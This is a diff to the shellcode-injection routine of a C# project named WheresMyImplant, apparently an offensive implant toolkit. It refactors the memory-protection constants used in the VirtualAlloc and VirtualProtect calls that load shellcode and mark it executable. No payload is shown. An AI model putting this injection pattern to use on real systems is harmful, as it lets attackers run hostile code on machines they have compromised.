@@ -38,7 +38,7 @@ namespace WheresMyImplant
             ////////////////////////////////////////////////////////////////////////////////
             IntPtr lpAddress = IntPtr.Zero;
             UInt32 dwSize = (UInt32)shellCodeBytes.Length;
-            IntPtr lpBaseAddress = kernel32.VirtualAlloc(lpAddress, dwSize, kernel32.MEM_COMMIT, Winnt.PAGE_READWRITE);
+            IntPtr lpBaseAddress = kernel32.VirtualAlloc(lpAddress, dwSize, kernel32.MEM_COMMIT, Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_READWRITE);
             if (IntPtr.Zero == lpBaseAddress)
             {
                 WriteOutputBad("Unable to allocate memory");
@@ -52,8 +52,8 @@ namespace WheresMyImplant
             WriteOutput(String.Format("Injected ShellCode at address 0x{0}", lpBaseAddress.ToString("X4")));
 
             ////////////////////////////////////////////////////////////////////////////////
-            UInt32 lpflOldProtect = 0;
-            if (!kernel32.VirtualProtect(lpBaseAddress, dwSize, Winnt.PAGE_EXECUTE_READ, ref lpflOldProtect))
+            Winnt.MEMORY_PROTECTION_CONSTANTS lpflOldProtect = Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_NOACCESS;
+            if (!kernel32.VirtualProtect(lpBaseAddress, dwSize, Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READ, ref lpflOldProtect))
             {
                 WriteOutputBad("VirtualProtectEx Failed");
                 return;
